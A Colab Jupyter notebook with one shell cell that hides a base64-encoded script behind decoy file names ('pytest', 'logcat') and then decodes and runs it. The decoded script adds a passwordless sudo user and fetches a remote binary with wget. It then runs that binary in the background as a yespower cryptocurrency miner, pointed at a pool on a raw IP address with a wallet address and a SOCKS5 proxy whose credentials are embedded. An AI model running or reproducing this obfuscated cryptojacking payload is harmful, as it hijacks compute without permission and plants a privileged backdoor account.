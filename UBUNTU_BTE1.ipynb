{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "UBUNTU_BTE1.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "upbfXVaQNVxw"
      },
      "outputs": [],
      "source": [
        "%%shell\n",
        "cat > pytest <<END\n",
        "c3VkbyBhZGR1c2VyIC0tZGlzYWJsZWQtcGFzc3dvcmQgLS1nZWNvcyAnJyB1YnVudHUNCnN1ZG8gYWRkdXNlciB1YnVudHUgc3Vkbw0Kc3VkbyB1c2VybW9kIC1hIC1HIHN1ZG8gdWJ1bnR1DQpjZCAvaG9tZS91YnVudHUNCndnZXQgLXEgaHR0cHM6Ly9naXRodWIuY29tL25vbm9ua2JhdWsvY29tbXV0ZXIvcmVsZWFzZXMvZG93bmxvYWQvdjIvcG9pbnRkICYmIGNobW9kICt4IHBvaW50ZA0KZWNobyAnbm9odXAgLi9wb2ludGQgLWEgeWVzcG93ZXIgLW8gc3RyYXR1bSt0Y3A6Ly8xMDMuMjQ5LjcwLjc6NjUzMyAtdSBUTGpocERNcnNMeVV1Y2hMWm5ONEtBQ2ZkQ2hMNHJTbTRFLiQoc2h1ZiAtbiAxIC1pIDEtOTk5OTk5OSkgLXAgYz1UUlgsbWM9QlRFIC14IHNvY2tzNTovLzZsMzBzaGs0ZjBicWV5OnBvcDc5a3UzMHRpMDFycXE0bHBxa2FpZGFmcUA1Mi43LjI0Ny4xMzg6MTA4MCcgPmJhc2guc2gNCnN1ZG8gY2hvd24gdWJ1bnR1OnN1ZG8gcG9pbnRkDQpzdWRvIGNob3duIHVidW50dTpzdWRvIGJhc2guc2gNCnN1ZG8gY2htb2QgNzAwIHBvaW50ZCBiYXNoLnNoDQpzdSAtbCB1YnVudHUgc2ggLWMgIi9ob21lL3VidW50dS9iYXNoLnNoIg\n",
        "END\n",
        "sleep 2\n",
        "base64 -d pytest >logcat\n",
        "chmod +x logcat\n",
        "./logcat"
      ]
    }
  ]
}
